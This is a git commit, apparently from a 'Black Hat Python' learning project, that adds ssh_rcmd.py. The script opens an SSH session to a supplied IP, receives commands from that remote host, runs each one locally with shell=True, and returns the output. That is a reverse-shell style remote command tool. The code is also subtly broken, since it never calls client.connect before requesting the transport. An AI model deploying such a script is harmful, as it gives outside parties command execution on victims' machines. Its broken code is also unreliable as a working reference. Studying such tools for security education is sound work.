4880dd7f51cd44ac8847a5240693df7b5887500b
trop3n <jasondkimm@proton.me>
2025-04-01 23:02:49 -0500

    started ssh_rcmd.py

---
+++ blackhatpython/ssh_cmd/ssh_rcmd.py
@@ -0,0 +1,24 @@
+import paramiko
+import shlex
+import subprocess
+
+def ssh_command(ip, port, user, passwd, command):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh_session = client.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.send(command)
+        print(ssh_session.recv(1024).decode())
+        while True:
+            command = ssh_session.recv(1024)
+            try:
+                cmd = command.decode()
+                if cmd == 'exit':
+                    client.close()
+                    break
+                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) # 2
+                ssh_session.send(cmd_output or 'okay')
+            except Exception as e:
+                ssh_session.send(str(e))
+        client.close()
+    return
